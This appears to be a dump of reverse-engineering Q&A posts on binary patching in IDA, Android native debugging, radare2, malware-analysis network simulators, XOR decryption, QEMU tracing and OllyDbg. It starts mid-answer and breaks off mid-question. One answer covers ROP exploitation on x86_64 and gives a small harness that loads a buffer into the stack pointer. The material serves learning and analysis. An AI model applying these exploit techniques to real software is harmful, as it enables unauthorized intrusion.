  *(_DWORD *)this = &amp;DATABASE_TABLE&lt;CFG_ENTRY_500_unsigned_int&gt;::_vftable_;
</code></pre>

<p>confirms that the 4 bytes at the beginning of the class structure are actually a pointer to the virtual function table of the class.</p>

<p>Second, your snippet</p>

<pre><code>.text:008EE639                 push    ebp
.text:008EE63A                 lea     ecx, [esp+50h+var_2C]
.text:008EE63E                 push    ecx
.text:008EE63F                 mov     ecx, ebx
.text:008EE637                 mov     eax, [ebx]
.text:008EE641                 call    dword ptr [eax+14h]
.text:008EE644 ;     ---------------------------------------------------------------------------         
.text:008EE644                 test    al, al ; HERE IS THE STACK REFERENCE
</code></pre>

<p>fits very well. (Again, i reordered the assembly instructions in a way that doesn't change what they do, but makes it clearer to understand them). Remember your vtable that had a function offset, a nullsub, 3 more function offsets, and <code>ReadCfgFile</code> as its entries? Since each of these has 4 bytes, the offset of the ReadCfgFile function pointer in the vtable is 20, or 14h. In that code snippet, ebx is a class pointer; <code>mov eax, [ebx]</code> gets the vtable pointer from the class pointer, and <code>call dword ptr [eax+14h]</code> calls the function at that offset, namely <code>ReadCfgFile</code>. Before that, it initializes the <code>this</code> register (ecx) to ebx, and pushes 2 parameters on the stack. This seems to be a very standard call to a class method.</p>

<p>Next, your constructor ends in</p>

<pre><code>unknown_libname_2673((char *)v1 + 4, 0x3E4u, 500, sub_8EEA00);
</code></pre>

<p>with the first parameter (v1+4) being the address of the ConfigurationEntries array within the Configuration class (i'm keeping my old invented variable/class names), the second parameter (0x3e4 == 996) the size of each array entry; the third (500) the number of entries, and a callback function. I'm almost sure this is the constructor function for the individual ConfigurationEntries. Which means this is the function i said you need to find, and which should be changed to</p>

<pre><code>unknown_libname_2673((char *)v1 + XXXXX, 0x3E4u, 1000, sub_8EEA00);
</code></pre>

<p>with XXXXX being the offset of the newEntries array once we allocate space for it.</p>

<p>Next, reconsidering a part of the code snippet before the indirect call to ReadConfigFile,</p>

<pre><code>.text:008EE62A                 mov     edx, [ebx]
.text:008EE62C                 mov     ecx, ebx
.text:008EE62E                 mov     [ebx+7A938h], ebp
.text:008EE634                 call    dword ptr [edx+4]
</code></pre>

<p>we see that there is a move to <code>ebx+7A938h</code>, with ebx being the class pointer, so there seems to be another class member at this offset. This is quite a lot of memory <em>after</em> the offset of the element count (79954h) - so the structure has a lot more components. Good thing you're not trying to shift them all. The constructor function, which accesses <code>this+502036</code>, or <code>this+0x7a914</code>, would have been another hint at that. (It also accesses <code>this+124503</code>, but with <code>this</code> being a dword pointer, this means 498012 bytes, which is still less than 502036).</p>

<p>Next, you found out the address 0190BD08, which is a very good thing. Along with the XREFs, and the data definition,</p>

<pre><code>.data:0190BD08 unk_190BD08     db    ? 
</code></pre>

<p>this means:</p>

<p>The class structure at that address is NOT allocated dynamically, and it is NOT initialized to anything, instead, it is an uninitialized global variable. In C++, it would have probably been a</p>

<pre><code>static Configuration myConfig;
</code></pre>

<p>with all the xrefs you're seeing being a reference to myConfig. As the assembly instructions at those places are</p>

<pre><code>mov     ecx, offset unk_190BD08
</code></pre>

<p>i'm almost sure the calls to a class member function are one or 2 instructions after each of these. Congractulations, you've just found a way to catch many of the instances where the configuration gets accessed. To verify this, unk_190BD08 being a global variable for the configuration, you could run the program with a breakpoint on the constructor function (sub_8EEFC0), i bet it's called only once, and 190BD08 is the parameter to it.</p>

<p>The bad thing about the configuration class instance being a static variable, not a new()-instantiated one, is that we can't just increase the size in the new() call. Instead, we'll have to move it to a part of the address space where it doesn't disturb anything else - at the end of the current uninitialized data segment. Find the very last entry in your data segment, then choose a nice address behind that, and rewrite all the xrefs to unk_190BD08 to that new address. Then, run the program using ollydbg, place a hardware breakpoint on 190BD08 just in case, and check that the functions you know to be class member functions, and the initialized, all get the new address instead of 190BD08 as their <code>ecx</code> (this) parameter. When you've finished, you're ready to implement the 2nd part, change the accesses to <code>this+4</code> to <code>this+XXXX</code> with <code>XXXX</code> being the class size.</p>

<p>The fact that we're missing a new() call for the Configuration variable means we can't use its parameter to get the class size. But we already know the class size is at least 7A938h, so the static variable occupies the address space from 0x190BD08 to at least 0x1986640. With a bit of luck, your .data segment has that unk_190BD08 label, with the next label being at an address a bit after 0x1986640, so the next label is some other variable, and the difference between both labels the size of the Configuration instance.</p>

<p>There's one thing left to do - when you move the configuration variable behind everything else, you'll also have to increase the size of that data segment in the PE file. Unfortunately, i'm not that skilled in the windows PE file format, so i'd have to do a lot of research how to do this correctly myself, so maybe you're lucky and someone else, who has more experience in this than i have, can help you with this.</p>

<hr>

<h2>Edit - Edit to answer to comment</h2>

<ul>
<li>how can I calculate how big is the CFG_DB class in order to append something at the end of it?</li>
</ul>

<p>The original C++ program will have had something like</p>

<pre><code>int somevariable;
int someothervariable;
CFG_DB globalConfig;
int athirdvariable;
</code></pre>

<p>(int as an example, the data type could be anything)
and the compiler should place all of these varuables into the uninitialized part of the .data segment. Any access to one of the variables will make IDA create a label at that memory address, with an XREF to where it's accessed. So, if your .data dump looks like this</p>

<pre><code>.data:0190BD08 unk_190BD08     db    ?        &lt;-- along with some xrefs 
.data:0190BD09                 db    ?        &lt;-- this repeats a lot of times
.data:01986670 unk_1986670     db    ?        &lt;-- along with some xrefs 
</code></pre>

<p>and you know that 0190BD08 is your <code>globalConfig</code>, then 01986670 is <code>athirdvariable</code>, and the size of globalConfig is 0x01986670 - 0x0190BD08 = 0x7a968 = 502120 bytes.</p>

<p>This is not 100% foolproof, because if anything accesses globalConfig.somemember, with somemember having a structure offset of, say, 500000 (=0x7a120), then IDA will generate a label and an XREF at 0x190BD08+0x7a120=0x1985E28 ass well. But with a bit of luck, the ""rest"" of the program will just use the globalConfig variable as an argument to a member function, where references are indirect, so they won't be used by IDA to create labels.</p>

<ul>
<li>what will happen if other classes/methods/etc are interacting with this modified class?</li>
</ul>

<p>If they access anything but the 500 individual config entries, nothing at all, because these haven't changed their offset. The thing that might be dangerous is when they access the entries, because those accesses should be rewritten to newEntries. You have to find out where they are (if you're lucky, that's just in the member functions) and patch the code at that point. The hardware breakpoint on the (old) entries[0] address (which is 0x190BD0C in your case, structure start + 4) should help with this, because anything that's likely to access any entry, is likely to access entry[0] as well. So, if you hit the hardware breakpoint, on, say, <code>mov eax, [ebx+4]</code>, then you know <code>ebx+4</code> is accessing the old address, and should be rewritten to <code>mov eax, [ebx+XXXXX]</code> to use the new array.</p>

<p>Unfortunately, you can't create a hardware breakpoint that covers the whole structure to catch any access. That's where the null pointer exceptions kick in. If, after the change, your program throws a NPE where it normally doesn't, it's probably because 'something' accessed the old array, which contains nothing but NULLs now, instead of the new one. Catching the NPE in the debugger, and checking the disassembly/call stack that lead to it, should give you an idea where the NULL pointer was read from the old array, so you know which instruction to change to point to the new one.</p>
","4296"
"Find file signatures inside an unknown file","2332","","<p>I have a .bin file I would like to analyse. Especially find images embedded in this firmware update.</p>

<ul>
<li><a href=""https://code.google.com/p/binwalk/"" rel=""nofollow"">binwalk</a> couldn't find anything.</li>
</ul>

<p>What other tools do you know to search for possible embedded files?</p>
","<p>Your best bet is <a href=""https://bitbucket.org/haypo/hachoir/wiki/hachoir-subfile"" rel=""nofollow noreferrer"">Hachoir-Subfile</a>. You can pass a file stream to Hachior-Subfile, it will search for all known embedded files and display the location. Some known formats it will calculate the size of the file. This makes it easy to carve out the files using dd. A helpful description of Hachoir-Subfile was left by one of the developers a couple weeks back in a similar <a href=""https://reverseengineering.stackexchange.com/a/1664/1425"">question</a>.</p>
","2164"
"Set breakpoint on shared library","2326","","<p>I am a noob to the reversing world.  I have a Android Java application which uses a shared library via JNI and I would like to set a breakpoint in the shared library.  The shared library is stripped so as I far as I understand I can set breakpoints by address only.  I have put the shared object through IDA and have a couple of positions I would like to set breakpoints but I am unsure on how I can calculate this or even if this is possible.  I am using gdbserver on Android attaching to the process and connecting from Mac OSX using gdb in the NDK.  I have been trying to calculate the memory address by taking what /proc/'pid'/smap gives me and calculating an offset from the IDA assembly I have.  Is this the right direction?  Is this even possible?</p>
","<p>I've been doing the same/similar stuff recently, and while you can get it to work, it's not that easy.</p>

<p>It helps if you have a rooted android device, a terminal emulator to run gdbserver, and, if possible, a terminal emulator that can open more than one window, so you kan kill the gdbserver from the second window if it hangs up. Also, a real keyboard on the android device helps, as it's much easier to repeat commands when you have real cursor keys.</p>

<p>You don't need to connect your Droid to your mac using an USB cable. I started gdbserver like this:</p>

<pre><code>gdbserver --attach 0.0.0.0:8765 2338
</code></pre>

<p>(where 2338 is the pid of my target application), then used</p>

<pre><code>$ arm-none-eabi-gdb
target remote 192.168.178.103:8765
</code></pre>

<p>to connect. 192.168.178.103 is the IP address of my android device.</p>

<p>I didn't want to install the complete NDK on my machine, so i downloaded the ARM GDB from <a href=""https://launchpad.net/gcc-arm-embedded/+download"" rel=""nofollow"">https://launchpad.net/gcc-arm-embedded/+download</a>, they have windows, linux and mac versions. The NDK GDB should probably work as well, of course.</p>

<p>You can add the ""IDA Address"" of the function to the Map address. For example, in my library:</p>

<ul>
<li>The two functions i was interested in had ""IDA addresses"" BA584 and BA99C.</li>
<li>The address in /proc/maps said 688D0000 as base address of the executable segment.</li>
<li>The real function addresses were 6898A584/6898A99C, which is base address + ""IDA address"" in both cases.</li>
</ul>

<p>There are two things to consider when you check you really found the correct address:</p>

<ul>
<li><p>You can't use the gdb disassemble command as it relies on functions and symbols. Use the x/i command to disassemble. For example, in my case, x/20i 0x6898A584 to see the 20 instructions at this address.</p></li>
<li><p>The arm has two different modes, Thumb mode and ARM mode. If gdb has no symbols, it might choose the wrong one when disassembling, making your GDB disassembly not resemble the IDA disassembly at all. </p></li>
</ul>

<p>Use <code>set arm force-mode arm</code> and <code>set arm force-mode thumb</code> to try both. For example, this is what IDA told me about my BA584 function:</p>

<pre><code>.text:000BA584
.text:000BA584 sub_BA584                               ; CODE XREF: sub_BF1C4+3Ap
...
.text:000BA584                 PUSH.W          {R4-R11,LR}
.text:000BA588                 MOV             R6, R0
.text:000BA58A                 SUB             SP, SP, #0x1C
.text:000BA58C                 LDR             R0, [R0,#0x18]
.text:000BA58E                 MOV             R4, R1
.text:000BA590                 STR             R2, [SP,#0x40+var_34]
</code></pre>

<p>this is what gdb made of it first:</p>

<pre><code>(gdb) x/20i 0x6890F584
 0x6890f584:  svcmi   0x00f0e92d
 0x6890f588:  addlt   r4, r7, r6, lsl #12
 0x6890f58c:  strmi   r6, [r12], -r0, lsl #19
 0x6890f590:  stmdacs r0, {r0, r1, r9, r12, pc}
 0x6890f594:  bichi   pc, r10, r0
 0x6890f598:  mlapl   r12, r6, r8, pc ; &lt;UNPREDICTABLE&gt;
 0x6890f59c:                  ; &lt;UNDEFINED&gt; instruction: 0xf0402d00
</code></pre>

<p>then</p>

<pre><code>(gdb) set arm force-mode thumb
(gdb) x/20i 0x6890F584
 0x6890f584:  stmdb   sp!, {r4, r5, r6, r7, r8, r9, r10, r11, lr}
 0x6890f588:  mov     r6, r0
 0x6890f58a:  sub     sp, #28
 0x6890f58c:  ldr     r0, [r0, #24]
 0x6890f58e:  mov     r4, r1
 0x6890f590:  str     r2, [sp, #12]
</code></pre>

<p>So don't give up if the disassembly looks weird, try forcing thumb / arm mode.</p>

<p>My application crashed various times when i was debugging it, which made gdbserver lose sync with gdb, resulting in lots of ""Ignoring packet error"" messages from gdb. Killing gdbserver (thus the 2nd window), restarting the application, and reconnecting gdb seemed to be the only remedy in these cases. When you restart the application, make sure you re-check /proc/..../maps for the .so base address, it stays the same most of the time but changes sometimes, especially when there's some time between invocations. You'll notice my address (0x6890F584) in the above example does not match the one i told you earlier, this is because in the example, the map base address had changed to 68855000.</p>
","4221"
"What does Hopper's Debugger Server do?","2326","","<p>Hopper offers a <a href=""http://www.hopperapp.com/HopperGDBServer/index.html"" rel=""nofollow noreferrer"">GDB/LLDB Debugger Server</a> companion to the standard program. I'm unclear on what this should / can  be used for. When I run the debugger server on the same machine that I'm using I see this:</p>

<p><img src=""https://i.stack.imgur.com/ODJUT.png"" alt=""enter image description here""></p>

<hr>

<p>There aren't really any options or built-in help. When I open <code>Hopper.app</code>'s debugger panel I only see the program running locally. I was initially thinking that the Remote Debugger was maybe used to offload some of the processing to another computer, but I've also tried running Hopper Debugger Server on another mac on my LAN but I don't see it come up in the list, only my local machine:</p>

<p><img src=""https://i.stack.imgur.com/cCHgb.png"" alt=""enter image description here""></p>

<hr>

<p>As there are no settings to specify remote connection information, I think I need to do something remotely that would specify a the address of the machine running Hopper so that it can sort of 'dial in' and then show up on the list.</p>

<p>I haven't had any luck with the Hopper website, forum, FAQ.</p>

<p>What am I missing?</p>

<p>Can anyone give me a brief outline of how the GDB/LLDB remote debugger<br>
is intended to be used (with Hopper) ?</p>
","<p>I'm surprised nobody posted an answer, but here's what I eventually came to realize:</p>

<p>A lot of times disassembling is used for taking apart potential malicious apps like viruses, worms, or malware to understand how they affect a system. There is both <a href=""https://reverseengineering.stackexchange.com/questions/3473/what-is-the-difference-between-static-disassembly-and-dynamic-disassembly"">static and dynamic disassembly</a>. Static disassembly poses (little) threat to your system as it is only looking through the code - however dynamic disassembly is actually running the code ( with breakpoints, etc ) - which is something you probably don't want to do on your main computer if the code is potentially malicious.</p>

<p>Here's what IDA says in a <a href=""https://www.hex-rays.com/products/ida/support/tutorials/unpack_pe/manual.shtml"" rel=""nofollow noreferrer"">tutorial about disassembling a ""hostile"" executable</a>:</p>

<blockquote>
  <p>We could put a breakpoint there and let the program run. Now, before we do that, let's repeat that it is not a good idea to run untrusted code on your computer. It is much better to have a separate ""sandbox"" machine for such tests, for example using the remote debugging facilities IDA offers. Therefore, IDA displays a warning when a new file is going to be started under debugger: ignore at your own risk.</p>
</blockquote>

<p>This finally made sense as an explanation for why you may want to use a remote debugger - seems so obvious now!</p>

<p>I'm still not exactly sure on how to setup and/or use Hopper's remote debugger but I'm sure I'll figure that out eventually.</p>
","9128"
"What are the main features of radare2?","2323","","<p><a href=""http://radare.org/y/"">Radare2</a> is a framework for reverse-engineering gathering several tools (see this <a href=""http://www.phrack.org/issues.html?issue=66&amp;id=14#article"">Phrack article</a> about radare1 to know a bit more about the framework).</p>

<p>I would like to know if someone could point out the main useful features of the framework for reverse engineering ? And, particularly what makes radare2 different from other tools or frameworks ?</p>
","<p>from its <a href=""http://radare.org/y/?p=features"">feature</a> page:</p>

<ul>
<li>Multi-architecture and multi-platform
<ul>
<li>GNU/Linux, Android, *BSD, OSX, iPhoneOS, Windows{32,64} and Solaris</li>
<li>x86{16,32,64}, dalvik, avr, arm, java, powerpc, sparc, mips, bf, csr, m86k, msil, sh</li>
<li>pe{32,64}, [fat]mach0{32,64}, elf{32,64}, te, dex and java classes</li>
</ul></li>
<li>Highly scriptable
<ul>
<li>Vala, Go, Python, Guile, Ruby, Perl, Lua, Java, JavaScript, sh, ..</li>
<li>batch mode and native plugins with full internal API access</li>
<li>native scripting based in mnemonic commands and macros</li>
</ul></li>
<li>Hexadecimal editor
<ul>
<li>64bit offset support with virtual addressing and section maps</li>
<li>Assemble and disassemble from/to many architectures</li>
<li>colorizes opcodes, bytes and debug register changes</li>
<li>print data in various formats (int, float, disasm, timestamp, ..)</li>
<li>search multiple patterns or keywords with binary mask support</li>
<li>checksumming and data analysis of byte blocks</li>
</ul></li>
<li>IO is wrapped
<ul>
<li>support Files, disks, processes and streams</li>
<li>virtual addressing with sections and multiple file mapping</li>
<li>handles gdb:// and rap:// remote protocols</li>
</ul></li>
<li>Filesystems support
<ul>
<li>allows to mount ext2, vfat, ntfs, and many others</li>
<li>support partition types (gpt, msdos, ..)</li>
</ul></li>
<li>Debugger support
<ul>
<li>gdb remote and <strong>brainfuck</strong> debugger support</li>
<li>software and hardware breakpoints</li>
<li>tracing and logging facilities</li>
</ul></li>
<li>Diffing between two functions or binaries
<ul>
<li>graphviz friendly code analysis graphs</li>
<li>colorize nodes and edges</li>
</ul></li>
<li>Code analysis at opcode, basicblock, function levels
<ul>
<li>embedded simple virtual machine to emulate code</li>
<li>keep track of code and data references</li>
<li>function calls and syscall decompilation</li>
<li>function description, comments and library signatures</li>
</ul></li>
</ul>
","1844"
"Are there any Windows alternatives to INetSim?","2320","","<p>I found a tool for Linux called <a href=""http://www.inetsim.org/about.html"" rel=""nofollow"">INetSim</a> which emulates services such as HTTP HTTPS IRC and many other. It is often used to trick malware. The problem is that INetSim works only on Linux. So I want Windows based tool for Win 7 32bit which is alternative to this ( I prefer a gui one ) </p>
","<p>Not a GUI tool, but <a href=""http://practicalmalwareanalysis.com/fakenet/"" rel=""noreferrer"">FakeNet</a> is a good alternative.</p>

<blockquote>
  <p>FakeNet is a tool that aids in the dynamic analysis of malicious
  software.  The tool simulates a network so that malware interacting
  with a remote host continues to run allowing the analyst to observe
  the malware’s network activity from within a safe environment.  The
  goal of the project is to:</p>

<pre><code>- Be easy to install and use; the tool runs on Windows and requires no 3rd party libraries
- Support the most common protocols used by malware
- Perform all activity on the local machine to avoid the need for a second virtual machine
- Provide python extensions for adding new or custom protocols
- Keep the malware running so that you can observe as much of its functionality as possible
- Have a flexible configuration, but no required configuration
</code></pre>
</blockquote>

<p><a href=""https://www.mandiant.com/resources/download/research-tool-mandiant-apatedns"" rel=""noreferrer"">Mandiant's ApateDNS</a> is a good tool for responding with fake DNS response:</p>

<blockquote>
  <p>Mandiant ApateDNS is a tool for controlling DNS responses though an
  easy to use GUI. As a phony DNS server, Mandiant ApateDNS spoofs DNS
  responses to a user-specified IP address by listening on UDP port 53
  on the local machine. Mandiant ApateDNS also automatically sets the
  local DNS to localhost. Upon exiting the tool, it sets back the
  original local DNS settings.</p>
</blockquote>

<p><img src=""https://i.stack.imgur.com/c0ETV.png"" alt=""enter image description here""></p>
","6000"
"Hex-Rays: JUMPOUT statements inserted due to incorrect autodetected function boundaries","2312","","<p>I'm trying to RE a Windows executable compiled with VS 2008. After the initial autoanalysis most functions are detected correctly; however, some have wrong end address — for some reason IDA places the end of the function earlier, leaving a chunk of code not associated with any function. The undetected function gets <code>noreturn</code> attribute and often has <code>sp-based autoanalysis failed</code> message. I have fixed most of these problems by hand. The problem is that Hex-Rays seems to use autodetected function boundaries and therefore the decompilation fails after a jump inside the function, which looks like a jump outside to Hex-Rays.</p>

<p>Example hex-rays output:</p>

<pre><code>void __thiscall sub_403CE0(void *this, unsigned int a2, int a3)
{
    sub_407F30(this, a2, a3);
    JUMPOUT(locret_403CFD);
}
</code></pre>

<p>As you can see, there is a <code>JUMPOUT</code> statement at the end of the function. This was correct before the function boundaries were adjusted, but now <code>locret_403CFD</code> belongs to the function itself and is not a jump “out”. Is there a way to tell hex-rays the function doesn't end here and pass a correct function start/end addresses to it?</p>
","<p>After some work with the database I figured out the reason of the strange behavior of IDA. The binary I'm trying to decompile is a GUI application that uses MFC; I have imported a number of MFC types from a PDB file obtained from Microsoft Symbol store. It's either an IDA bug or corrupted PDB — if I don't import types, all functions are detected correctly and decompilation works as expected, if I do — many function boundaries go wrong, decompilation fails, function attributes are ignored by Hex-Rays and so on.</p>

<p>One of possible workarounds is to export the database as IDC file and then run the resulting script on a clean database. This way, function prototypes and type information are kept intact. Hex-Rays decompiled results will differ, though (variable mapping information is lost, and so are local variable names). </p>
","10916"
"How to decrypt data in binary file by XOR operator using a given key at specific offset?","2302","","<p>I've a binary data files which are encrypted by a simple <a href=""https://en.wikipedia.org/wiki/XOR_cipher"" rel=""nofollow"">XOR cipher</a> using a given key at offset <code>+0x88</code> (which is <code>0x80</code> long), then the data (<code>+0x108</code>) is compressed by <code>lzo1x</code>.</p>

<p>What would be the most efficient way of decrypting such files?</p>

<p>Preferably by using some command-line utilities (where I can specify the input offsets) or some script (without too much coding)?</p>

<p>What would be the right approach?</p>
","<p>Use <code>dd</code> to extract the data what you need, e.g. (using bash syntax):</p>

<pre><code>dd if=foo.dat bs=1 skip=$((0x88)) count=$((0x80)) of=xorkey.bin
dd if=foo.dat bs=1 skip=$((0x108)) of=data1.bin
</code></pre>

<p>Then convert it using simple Python code:</p>

<pre><code>#!/usr/bin/env python3

def str_xor(data, key):
    for i in range(len(data)):
        data[i] ^= key[i % len(key)]
    return data

key  = bytearray(open('xorkey.bin', 'rb').read())
data = bytearray(open('data1.bin',  'rb').read())
encoded = str_xor(data, key)
open(""data1.bin.xor"", ""wb"").write(encoded)
decoded = str_xor(data, key)
open(""data1.bin.xor.xor"", ""wb"").write(decoded)
</code></pre>

<p>Then install <code>lzop</code> tool which offers compression/decompression of the LZO1X algorithms (install via: <code>apt-get</code>/<code>brew</code> <code>install lzop</code>), e.g.:</p>

<pre><code>lzop -dc data1.bin.xor &gt; data1.out
</code></pre>
","11036"
"ROP exploitation in x86_64 linux","2302","","<p>I am working on return oriented programming exploitation on a x86_64 Linux.
However, my research leads to impossibility of ROP exploitation in 64-bit Linux machine because all of code segments are loaded in null byte leading addresses.
Is it true?</p>

<pre><code>Gdb,Sections:
(gdb) i file
    `/home/******/Desktop/BOF/lib64', file type elf64-x86-64.
    Entry point: 0x400ffc
    0x0000000000400190 - 0x00000000004001b0 is .note.ABI-tag
    0x00000000004001b0 - 0x00000000004001d4 is .note.gnu.build-id
    0x00000000004001d8 - 0x00000000004002f8 is .rela.plt
    0x00000000004002f8 - 0x0000000000400312 is .init
    0x0000000000400320 - 0x00000000004003e0 is .plt
    0x00000000004003e0 - 0x0000000000494808 is .text
    0x0000000000494810 - 0x000000000049614c is __libc_freeres_fn
    0x0000000000496150 - 0x00000000004961f8 is __libc_thread_freeres_fn
    0x00000000004961f8 - 0x0000000000496201 is .fini
    0x0000000000496220 - 0x00000000004b6224 is .rodata
    0x00000000004b6228 - 0x00000000004b6230 is __libc_atexit
    0x00000000004b6230 - 0x00000000004b6288 is __libc_subfreeres
    0x00000000004b6288 - 0x00000000004b6290 is __libc_thread_subfreeres
    0x00000000004b6290 - 0x00000000004c32ac is .eh_frame
    0x00000000004c32ac - 0x00000000004c33b9 is .gcc_except_table
    0x00000000006c3ea0 - 0x00000000006c3ec0 is .tdata
    0x00000000006c3ec0 - 0x00000000006c3ef8 is .tbss
    0x00000000006c3ec0 - 0x00000000006c3ed0 is .init_array
    0x00000000006c3ed0 - 0x00000000006c3ee0 is .fini_array
    0x00000000006c3ee0 - 0x00000000006c3ee8 is .jcr
    0x00000000006c3f00 - 0x00000000006c3ff0 is .data.rel.ro
    0x00000000006c3ff0 - 0x00000000006c4000 is .got
    0x00000000006c4000 - 0x00000000006c4078 is .got.plt
    0x00000000006c4080 - 0x00000000006c56f0 is .data
    0x00000000006c5700 - 0x00000000006c8308 is .bss
    0x00000000006c8308 - 0x00000000006c8338 is __libc_freeres_ptrs

    0x0000000000400190 - 0x00000000004001b0 is .note.ABI-tag
    0x00000000004001b0 - 0x00000000004001d4 is .note.gnu.build-id
    0x00000000004001d8 - 0x00000000004002f8 is .rela.plt
    0x00000000004002f8 - 0x0000000000400312 is .init
    0x0000000000400320 - 0x00000000004003e0 is .plt
    0x00000000004003e0 - 0x0000000000494808 is .text
    0x0000000000494810 - 0x000000000049614c is __libc_freeres_fn
    0x0000000000496150 - 0x00000000004961f8 is __libc_thread_freeres_fn
    0x00000000004961f8 - 0x0000000000496201 is .fini
    0x0000000000496220 - 0x00000000004b6224 is .rodata
    0x00000000004b6228 - 0x00000000004b6230 is __libc_atexit
    0x00000000004b6230 - 0x00000000004b6288 is __libc_subfreeres
    0x00000000004b6288 - 0x00000000004b6290 is __libc_thread_subfreeres
    0x00000000004b6290 - 0x00000000004c32ac is .eh_frame
    0x00000000004c32ac - 0x00000000004c33b9 is .gcc_except_table
    0x00000000006c3ea0 - 0x00000000006c3ec0 is .tdata
    0x00000000006c3ec0 - 0x00000000006c3ef8 is .tbss
    0x00000000006c3ec0 - 0x00000000006c3ed0 is .init_array
    0x00000000006c3ed0 - 0x00000000006c3ee0 is .fini_array
    0x00000000006c3ee0 - 0x00000000006c3ee8 is .jcr
    0x00000000006c3f00 - 0x00000000006c3ff0 is .data.rel.ro
    0x00000000006c3ff0 - 0x00000000006c4000 is .got
    0x00000000006c4000 - 0x00000000006c4078 is .got.plt
    0x00000000006c4080 - 0x00000000006c56f0 is .data
    0x00000000006c5700 - 0x00000000006c8308 is .bss
    0x00000000006c8308 - 0x00000000006c8338 is __libc_freeres_ptrs
</code></pre>
","<p>This comes down to the type of bug you are exploiting. If your payload cant contain null bytes (a vulnerable strcpy), this can become an issue, however not all bugs have this constraint. Take for example a bug in how a filetype is parsed, which allows null bytes. </p>

<p>Also there is the possibility of a series of bugs to be used, for example, the idea of heap spraying. Generally you spray the heap doing other ""legitimate"" things, such as in <a href=""https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/"">this write up</a> by corelancoder. His shell code, which would be your ROP chain, is part bitmap files that he consecutively loads to ""spray the heap"", while the bug is actually triggered by javascript and doesn't actually contain the shellcode.</p>

<p>If you want to just work on ROP, and not worry about byte limitations, i'd suggest writing a simple harness to test your shellcode.</p>

<p><strong>EDIT</strong> Sorry wrong harness. This one is clearly 64-bit specific.</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int data[10000000];

void start_rop(char * rop)
{
        __asm(""mov (%rax),%rsp""); //move contents of first argument into the stack pointer
}

int main(int argc, char * argv)
{

        char  code[] = ""AAAAAAAA"";
        char * malloc_code = (char *)malloc(sizeof(code));
        memcpy(malloc_code,&amp;code,sizeof(code));

        start_rop(malloc_code);

        free(malloc_code);
        return 0;
}
</code></pre>
","3731"
"Tools to work cooperatively on the same binary","2301","","<p>What's a working tool/methodology to work cooperatively on the same binary (if possible in parallel), that is proven to work?</p>

<hr>

<p>I used various methods long ago to share information with others, but not in parallel:</p>

<ul>
<li>sending IDB back &amp; forth</li>
<li>sharing TXT notes on a repository</li>
<li>exporting IDB to IDC and sharing the IDC on a repository</li>
</ul>

<p>However, none of these were really efficient. I am looking for better methodologies and tools for collaborative work.</p>
","<p>Just to expand on @ange's answer, IDA Toolbag is a lightweight solution for collaboration using their <a href=""http://thunkers.net/~deft/code/toolbag/docs.html#Queues"" rel=""nofollow noreferrer"">""Queues"" feature</a>. I have tested that it does work, and I believe it provides all the features you mentioned in your question.</p>

<p><img src=""https://i.stack.imgur.com/9ooB8.png"" alt=""enter image description here""></p>

<p><img src=""https://i.stack.imgur.com/sax1L.png"" alt=""enter image description here""></p>
","1354"
"Idapython: How to get the opcode bytes corresponding to an instruction?","2297","","<p><a href=""https://i.stack.imgur.com/PCt3C.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/PCt3C.png"" alt=""IDA screen shot""></a></p>

<p>How do I get the <code>8B 45 FC</code> corresponding to the  <code>mov     eax, [rbp+var_4]</code>
etc. via idapython?</p>

<p>I did not come up with a better solution than</p>

<ol>
<li>Getting the instruction via <code>idautils.DecodeInstruction()</code></li>
<li>Getting the instruction's size in bytes</li>
<li>Looping over all bytes of the instruction and fetching the content via <code>idc.Byte()</code></li>
</ol>

<p>Is there a better solution, e.g. an api call (which I did not find)?</p>
","<p>Another solution:</p>

<pre><code>ea = ScreenEA() # Or whatever you want
buf = idc.GetManyBytes(ea, ItemSize(ea))
</code></pre>
","12010"
"Using QEmu monitor interface to extract execution traces from a binary?","2288","","<p>My original point was to build something a bit more powerful and generic than a <code>PTRACE</code> system call for Linux platforms. The problem with <code>PTRACE</code> is that it only run on your own system and architecture.</p>

<p>An idea would be to run a virtual machine (or, better, an emulator) with a different operating system and a (possibly) different architecture on it.</p>

<p>While looking for the ideal candidates, I found the <a href=""http://en.wikibooks.org/wiki/QEMU/Monitor"">QEmu monitor interface</a> and several projects using <a href=""http://wiki.qemu.org/Main_Page"">QEmu</a> as OS/architecture emulator to collect traces:</p>

<ul>
<li><a href=""http://www.s3.eurecom.fr/tools/avatar/"">Avatar</a></li>
<li><a href=""https://code.google.com/p/decaf-platform/wiki/DECAF"">DECAF</a> (successor of TEMU)</li>
<li><a href=""https://github.com/moyix/panda"">PANDA</a></li>
<li><a href=""http://s2e.epfl.ch/"">S2E</a> (seems to be a sub-component of Avatar?)</li>
<li><a href=""http://bitblaze.cs.berkeley.edu/temu.html"">TEMU</a> (<a href=""http://bitblaze.cs.berkeley.edu/"">Bitblaze</a>)</li>
</ul>

<p>The features I want are similar to the <code>PTRACE</code> interface (freeze execution, step by step runs, memory and registers read and write, ...) all with several OSes and several architectures. </p>

<p>My questions:</p>

<ul>
<li>Did I forgot some similar projects in my list ?</li>
<li>Can the QEmu monitor interface provide a system/architecture agnostic <code>PTRACE</code> interface just as I want ? And, if not, what are the main issues I might run into while implementing it inside QEmu ?</li>
</ul>
","<p>PANDA developer here. I think that actually most of the things you want are supported by QEMU's native gdbstub. If you start QEMU with the <code>-s -S</code> options, it will listen on port 1234 for incoming connections, and provide the functionality you want, including:</p>

<ul>
<li>Single-step using the <code>si</code> command</li>
<li>Register get/set using <code>info reg</code> and (for example) <code>set $edi = 0x40c8c39</code></li>
<li>Reading memory contents with the <code>x</code> command</li>
<li>Modify memory using <code>set *(char *) 0x1a5f2c0 = 0xd9</code></li>
<li>Breakpoints using (e.g.) <code>break *0x826e2671</code></li>
</ul>

<p>So using some gdb scripting, I think you should be able to get the capabilities you want with plain gdb and QEMU.</p>

<p>All this was just tested using a Windows 7 32-bit VM and gdb using the <code>target remote :1234</code> command.</p>
","4779"
"OllyDbg: How to set conditional breakpoint on a register value?","2283","","<p>I want to set a breakpoint when the register EAX references a specific Unicode string, e.g. ""Enter"". In Ollydbg there is usually right beside the EAX value a string that says ""ASCII: Enter "".</p>

<p>I read that I have to use Olly v1.10 for this purpose. When I go to ""Debug"" -> ""Set Condition"" I can write in the text field ""Condition is TRUE"" for instance this:</p>

<pre><code>EAX == 00000010
</code></pre>

